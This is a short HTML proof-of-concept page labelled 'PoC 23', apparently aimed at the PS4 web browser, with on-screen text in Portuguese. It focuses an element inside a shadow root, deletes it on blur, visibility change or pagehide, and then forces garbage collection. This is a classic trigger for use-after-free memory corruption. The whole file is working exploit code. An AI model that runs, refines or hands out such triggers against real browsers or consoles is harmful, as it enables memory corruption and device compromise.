<!DOCTYPE html>
<html>
<body>
<p>PoC 23 - visibility / pagehide</p>
<div id="host"></div>
<div id="result"></div>
<script>
function gc() {
    function gcRec(n) {
        if (n < 1) return {};
        var temp = {i: "ab" + i + (i / 100000)};
        temp += "foo";
        gcRec(n-1);
    }
    for (var i = 0; i < 10000; i++) gcRec(10);
}

let shadowRoot = host.attachShadow({ mode: 'open' });
let victim = document.createElement('div');
victim.tabIndex = 0;
victim.textContent = 'Focusable - agora aperte Home';
shadowRoot.appendChild(victim);
victim.focus();

function kill() {
    if (victim) {
        victim.remove();
        victim = null;
        gc();
    }
}

document.addEventListener('blur', kill, true);
window.addEventListener('blur', kill, true);
document.addEventListener('visibilitychange', () => {
    if (document.hidden) kill();
});
window.addEventListener('pagehide', kill);

result.textContent = 'Aperte o botão Home do PS4 agora';
</script>
</body>
</html>
